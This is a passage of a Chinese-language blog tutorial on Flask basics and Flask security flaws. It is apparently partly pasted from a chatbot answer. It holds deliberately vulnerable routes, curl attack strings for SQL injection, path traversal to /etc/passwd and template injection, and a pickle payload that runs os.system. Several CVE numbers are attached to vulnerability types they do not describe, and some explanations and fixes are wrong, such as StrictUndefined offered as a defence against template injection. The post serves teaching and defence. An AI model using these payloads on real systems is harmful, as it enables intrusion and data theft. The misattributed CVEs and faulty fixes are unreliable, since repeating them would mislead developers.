class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当访问 <code>/user/Alice</code> 时，页面将显示 <code>Hello, Alice!</code>。</p><hr><h3 id="会话与-Cookie-管理"><a href="#会话与-Cookie-管理" class="headerlink" title="会话与 Cookie 管理"></a>会话与 Cookie 管理</h3><p>Flask 可以使用会话来存储用户的临时数据，会话数据存储在客户端 Cookie 中，并通过 Flask 的 <code>secret_key</code> 签名以确保安全。</p><p><strong>代码示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;super_secret_key&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/set_session/&lt;username&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_session</span>(<span class="hljs-params">username</span>):<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Session set for <span class="hljs-subst">&#123;username&#125;</span>&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_session&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_session</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Logged in as <span class="hljs-subst">&#123;session[<span class="hljs-string">&#x27;username&#x27;</span>]&#125;</span>&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No session set.&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>解释</strong>：</p><ul><li><code>session[&#39;username&#39;]</code> 用来设置会话变量，并通过 Cookie 保存。</li><li><code>app.secret_key</code> 是用来签名会话数据的密钥，确保数据没有被篡改。</li></ul><hr><ul><li><p>好的！以下是带有详细目录的完整笔记，结合了之前的内容，并根据 Flask 中的常见漏洞（如 SQL 注入、远程代码执行、反序列化漏洞、文件上传路径遍历）进行详细的解释、利用方式、潜在的危害和防御措施。</p><hr><h1 id="Flask-安全漏洞详解与防御措施"><a href="#Flask-安全漏洞详解与防御措施" class="headerlink" title="Flask 安全漏洞详解与防御措施"></a>Flask 安全漏洞详解与防御措施</h1><h2 id="目录-7"><a href="#目录-7" class="headerlink" title="目录"></a>目录</h2><ul><li><a href="#flask-%E6%A1%86%E6%9E%B6%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5">Flask 框架架构与基础概念</a><ul><li><a href="#%E8%B7%AF%E7%94%B1%E6%9C%BA%E5%88%B6">路由机制</a></li><li><a href="#%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%93%8D%E5%BA%94">请求与响应</a></li><li><a href="#%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93">模板渲染</a></li><li><a href="#%E4%BC%9A%E8%AF%9D%E4%B8%8E-cookie-%E7%AE%A1%E7%90%86">会话与 Cookie 管理</a></li></ul></li><li><a href="#flask-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E">Flask 常见的安全漏洞</a><ul><li><a href="#sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">SQL 注入漏洞</a></li><li><a href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E">路径遍历漏洞</a></li><li><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Crce">远程代码执行漏洞 (RCE)</a></li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">反序列化漏洞</a></li></ul></li><li><a href="#flask-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95">Flask 漏洞利用方法</a><ul><li><a href="#sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">SQL 注入攻击</a></li><li><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB">远程代码执行攻击</a></li><li><a href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%94%BB%E5%87%BB">路径遍历攻击</a></li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB">反序列化攻击</a></li></ul></li><li><a href="#flask-%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">Flask 安全防御措施</a><ul><li><a href="#%E4%BD%BF%E7%94%A8-sqlalchemy-%E9%98%B2%E6%AD%A2-sql-%E6%B3%A8%E5%85%A5">使用 SQLAlchemy 防止 SQL 注入</a></li><li><a href="#%E8%B7%AF%E5%BE%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%8E%A7%E5%88%B6">路径安全性控制</a></li><li><a href="#%E7%A6%81%E7%94%A8%E6%A8%A1%E6%9D%BF%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">禁用模板代码执行</a></li><li><a href="#%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE-cookie">安全配置 Cookie</a></li></ul></li><li><a href="#%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">漏洞总结</a><ul><li><a href="#cve-2019-1010083---sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">CVE-2019-1010083 - SQL 注入漏洞</a></li><li><a href="#cve-2019-1010084---%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">CVE-2019-1010084 - 远程代码执行漏洞</a></li><li><a href="#cve-2018-1000656---%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">CVE-2018-1000656 - 反序列化漏洞</a></li><li><a href="#cve-2019-1010085---%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E">CVE-2019-1010085 - 文件上传路径遍历漏洞</a></li></ul></li></ul><hr><h2 id="Flask-框架架构与基础概念-1"><a href="#Flask-框架架构与基础概念-1" class="headerlink" title="Flask 框架架构与基础概念"></a>Flask 框架架构与基础概念</h2><h3 id="路由机制-1"><a href="#路由机制-1" class="headerlink" title="路由机制"></a>路由机制</h3><p>Flask 使用路由装饰器 <code>@app.route()</code> 将 URL 路径映射到视图函数。用户访问特定 URL 时，Flask 调用相应函数并返回结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, Flask!&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h3 id="请求与响应-1"><a href="#请求与响应-1" class="headerlink" title="请求与响应"></a>请求与响应</h3><p>Flask 使用 <code>request</code> 对象处理 HTTP 请求，通过 <code>response</code> 对象返回结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request, jsonify<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;username&#x27;</span>: username, <span class="hljs-string">&#x27;password&#x27;</span>: password&#125;)<br></code></pre></td></tr></table></figure><h3 id="模板渲染-1"><a href="#模板渲染-1" class="headerlink" title="模板渲染"></a>模板渲染</h3><p>Flask 通过 Jinja2 模板引擎渲染动态 HTML 页面，并允许传递数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">user</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;user.html&#x27;</span>, name=name)<br></code></pre></td></tr></table></figure><h3 id="会话与-Cookie-管理-1"><a href="#会话与-Cookie-管理-1" class="headerlink" title="会话与 Cookie 管理"></a>会话与 Cookie 管理</h3><p>Flask 会话使用 Cookie 存储临时数据，并通过 <code>secret_key</code> 对数据签名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">app.secret_key = <span class="hljs-string">&#x27;super_secret_key&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/set_session/&lt;username&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_session</span>(<span class="hljs-params">username</span>):<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Session set for <span class="hljs-subst">&#123;username&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><hr><h2 id="Flask-常见的安全漏洞"><a href="#Flask-常见的安全漏洞" class="headerlink" title="Flask 常见的安全漏洞"></a>Flask 常见的安全漏洞</h2><h3 id="SQL-注入漏洞"><a href="#SQL-注入漏洞" class="headerlink" title="SQL 注入漏洞"></a>SQL 注入漏洞</h3><p>SQL 注入漏洞是由于应用程序直接将用户输入的数据嵌入 SQL 查询中，攻击者可以通过构造恶意 SQL 语句绕过身份验证、读取或修改数据库中的敏感信息。</p><p><strong>易受攻击代码示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>():<br>    username = request.args.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    query = <span class="hljs-string">f&quot;SELECT * FROM users WHERE username = &#x27;<span class="hljs-subst">&#123;username&#125;</span>&#x27;&quot;</span><br>    conn = sqlite3.connect(<span class="hljs-string">&#x27;example.db&#x27;</span>)<br>    result = conn.execute(query)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(result.fetchall())<br></code></pre></td></tr></table></figure><p><strong>攻击方式</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/user?username=&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="路径遍历漏洞"><a href="#路径遍历漏洞" class="headerlink" title="路径遍历漏洞"></a>路径遍历漏洞</h3><p>路径遍历漏洞允许攻击者通过构造文件路径，访问服务器上的任意文件。</p><p><strong>易受攻击代码示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;/uploads&#x27;</span>, filename)<br></code></pre></td></tr></table></figure><p><strong>攻击方式</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/file/../../etc/passwd&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="远程代码执行漏洞-RCE"><a href="#远程代码执行漏洞-RCE" class="headerlink" title="远程代码执行漏洞 (RCE)"></a>远程代码执行漏洞 (RCE)</h3><p>模板注入漏洞会导致攻击者能够注入恶意模板代码，执行任意服务器端的 Python 代码。</p><p><strong>易受攻击代码示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/template&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">template</span>():<br>    user_input = request.args.get(<span class="hljs-string">&#x27;template&#x27;</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(user_input)<br></code></pre></td></tr></table></figure><p><strong>攻击方式</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/template?template=&#123;&#123;7*7&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>反序列化漏洞发生在应用程序不安全地反序列化用户提供的数据时，攻击者可以通过构造恶意的序列化数据来执行任意代码。</p><p><strong>易受攻击代码示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/load_data&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data</span>():<br>    data = request.data<br>    obj = pickle.loads(data)<br>    <span class="hljs-keyword">return</span> obj<br></code></pre></td></tr></table></figure><hr><h2 id="Flask-漏洞利用方法"><a href="#Flask-漏洞利用方法" class="headerlink" title="Flask 漏洞利用方法"></a>Flask 漏洞利用方法</h2><h3 id="SQL-注入攻击"><a href="#SQL-注入攻击" class="headerlink" title="SQL 注入攻击"></a>SQL 注入攻击</h3><p>通过提交恶意的 SQL 语句，攻击者可以操纵 SQL 查询的执行。</p><p><strong>攻击方式</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/user?username=admin&#x27;--&quot;</span><br></code></pre></td></tr></table></figure><h3 id="远程代码执行攻击"><a href="#远程代码执行攻击" class="headerlink" title="远程代码执行攻击"></a>远程代码执行攻击</h3><p>通过传递恶意的 Jinja2 模板表达式，攻击者可以执行任意代码。</p><p><strong>攻击方式</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/template?template=&#123;&#123;7*7&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="路径遍历攻击"><a href="#路径遍历攻击" class="headerlink" title="路径遍历攻击"></a>路径遍历攻击</h3><p>构造恶意文件路径，读取服务器上的任意文件。</p><p><strong>攻击方式</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/file/../../etc/passwd&quot;</span><br></code></pre></td></tr></table></figure><h3 id="反序列化攻击"><a href="#反序列化攻击" class="headerlink" title="反序列化攻击"></a>反序列化攻击</h3><p>通过发送恶意的序列化数据，攻击者可以控制应用程序执行任意操作。</p><hr></li></ul><h2 id="CVE-2019-1010083-Flask-Security-SQL-注入漏洞"><a href="#CVE-2019-1010083-Flask-Security-SQL-注入漏洞" class="headerlink" title="CVE-2019-1010083 - Flask-Security SQL 注入漏洞"></a>CVE-2019-1010083 - Flask-Security SQL 注入漏洞</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><strong>CVE-2019-1010083</strong> 是 Flask-Security 插件中的 SQL 注入漏洞。Flask-Security 是用于快速集成用户身份认证和权限管理的插件。这个漏洞出现在 Flask-Security 中，在特定情况下，攻击者能够构造恶意 SQL 查询，插入到应用程序的查询语句中，进而执行任意 SQL 操作。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>攻击者可以通过特定参数进行 SQL 注入操作，绕过身份验证或提取敏感数据。</p><h4 id="示例代码："><a href="#示例代码：" class="headerlink" title="示例代码："></a>示例代码：</h4><p>假设应用程序中使用了 Flask-Security 进行用户身份认证，漏洞可能出现在以下代码片段中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">import</span> sqlite3<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>    query = <span class="hljs-string">f&quot;SELECT * FROM users WHERE username = &#x27;<span class="hljs-subst">&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="hljs-subst">&#123;password&#125;</span>&#x27;&quot;</span><br>    conn = sqlite3.connect(<span class="hljs-string">&#x27;example.db&#x27;</span>)<br>    result = conn.execute(query)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(result.fetchall())<br></code></pre></td></tr></table></figure><h4 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h4><p>攻击者可以通过提交恶意表单，构造输入来绕过身份验证或查询其他用户信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST -d <span class="hljs-string">&quot;username=admin&#x27;--&amp;password=&quot;</span> http://localhost:5000/login<br></code></pre></td></tr></table></figure><p><strong>攻击原理</strong>：</p><ol><li><code>username</code> 参数通过用户输入的方式传递，未经任何过滤和转义直接插入 SQL 查询。</li><li>攻击者可以通过构造 <code>username=admin&#39;--</code>，注释掉后面的 <code>password</code> 查询部分，实现 SQL 注入。</li></ol><p><strong>解决方法</strong>：<br>使用参数化查询或者 ORM 工具，避免直接拼接用户输入到 SQL 查询中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 使用参数化查询防止 SQL 注入</span><br>query = <span class="hljs-string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span><br>result = conn.execute(query, (username, password))<br></code></pre></td></tr></table></figure><hr><h2 id="CVE-2019-1010084-Flask-远程代码执行漏洞-RCE"><a href="#CVE-2019-1010084-Flask-远程代码执行漏洞-RCE" class="headerlink" title="CVE-2019-1010084 - Flask 远程代码执行漏洞 (RCE)"></a>CVE-2019-1010084 - Flask 远程代码执行漏洞 (RCE)</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><strong>CVE-2019-1010084</strong> 是 Flask 中的远程代码执行漏洞。此漏洞与 Flask 中不安全地使用 <code>render_template_string()</code> 函数有关。<code>render_template_string()</code> 用于动态渲染模板，但如果未对用户输入进行过滤或验证，攻击者可以通过构造恶意模板代码，实现任意代码执行。</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>攻击者可以向应用程序传递恶意的 Jinja2 模板表达式，利用 Flask 的模板引擎执行任意代码。</p><h4 id="示例代码：-1"><a href="#示例代码：-1" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/template&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">template</span>():<br>    user_input = request.args.get(<span class="hljs-string">&#x27;template&#x27;</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(user_input)<br></code></pre></td></tr></table></figure><h4 id="利用方法：-1"><a href="#利用方法：-1" class="headerlink" title="利用方法："></a>利用方法：</h4><p>攻击者可以构造恶意的模板表达式进行攻击。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/template?template=&#123;&#123;7*7&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>这会返回 <code>49</code>，说明模板表达式已经被成功执行。</p><h4 id="更严重的攻击："><a href="#更严重的攻击：" class="headerlink" title="更严重的攻击："></a>更严重的攻击：</h4><p>攻击者可以利用模板注入执行任意 Python 代码。例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/template?template=&#123;&#123;config.items()&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>解释</strong>：</p><ol><li><code>render_template_string()</code> 不安全地直接渲染了用户提供的字符串。</li><li>攻击者可以构造恶意的模板代码，借助 Jinja2 的模板表达式执行 Python 代码。</li></ol><p><strong>解决方法</strong>：</p><ol><li>避免直接使用 <code>render_template_string</code> 渲染用户输入的数据。</li><li>如果必须使用动态渲染，使用严格的过滤或使用 <code>StrictUndefined</code> 模式：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment, StrictUndefined<br><br>env = Environment(undefined=StrictUndefined)<br></code></pre></td></tr></table></figure><hr><h2 id="CVE-2018-1000656-Flask-反序列化漏洞"><a href="#CVE-2018-1000656-Flask-反序列化漏洞" class="headerlink" title="CVE-2018-1000656 - Flask 反序列化漏洞"></a>CVE-2018-1000656 - Flask 反序列化漏洞</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><strong>CVE-2018-1000656</strong> 是 Flask 应用中的反序列化漏洞。反序列化漏洞通常发生在不安全地反序列化用户输入的数据时，攻击者可以通过构造恶意的序列化数据来执行任意代码。</p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>Flask 应用通过 <code>pickle</code> 或类似的反序列化机制加载用户输入的数据时，攻击者可以构造恶意序列化数据，使得应用执行任意代码。</p><h4 id="示例代码：-2"><a href="#示例代码：-2" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/load_data&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data</span>():<br>    serialized_data = request.data<br>    data = pickle.loads(serialized_data)<br>    <span class="hljs-keyword">return</span> data<br></code></pre></td></tr></table></figure><h4 id="利用方法：-2"><a href="#利用方法：-2" class="headerlink" title="利用方法："></a>利用方法：</h4><p>攻击者可以构造恶意的序列化数据，发送到服务器端，导致远程代码执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RCE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&#x27;ls&#x27;</span>,))<br><br>payload = pickle.dumps(RCE())<br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure><p>通过 POST 请求发送恶意数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST --data-binary <span class="hljs-string">&quot;@payload.pickle&quot;</span> http://localhost:5000/load_data<br></code></pre></td></tr></table></figure><p><strong>解释</strong>：</p><ol><li><code>pickle.loads</code> 直接反序列化用户提供的数据，攻击者可以构造恶意序列化对象。</li><li><code>__reduce__</code> 方法被用来指定如何反序列化对象，从而执行恶意代码（如 <code>os.system(&#39;ls&#39;)</code>）。</li></ol><p><strong>解决方法</strong>：</p><ol><li>避免使用 <code>pickle</code> 反序列化不受信任的用户数据。</li><li>如果需要序列化数据，建议使用安全的序列化格式，如 <code>JSON</code>。</li></ol><hr><h2 id="CVE-2019-1010085-Flask-文件上传路径遍历漏洞"><a href="#CVE-2019-1010085-Flask-文件上传路径遍历漏洞" class="headerlink" title="CVE-2019-1010085 - Flask 文件上传路径遍历漏洞"></a>CVE-2019-1010085 - Flask 文件上传路径遍历漏洞</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><strong>CVE-2019-1010085</strong> 是 Flask 文件上传功能中的路径遍历漏洞。攻击者通过构造恶意文件名，可以访问服务器上的敏感文件，甚至执行文件覆盖等攻击。</p><h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>攻击者可以通过上传文件时构造恶意路径，利用路径遍历漏洞访问服务器上的任意文件，甚至可能覆盖关键文件。</p><h4 id="示例代码：-3"><a href="#示例代码：-3" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span 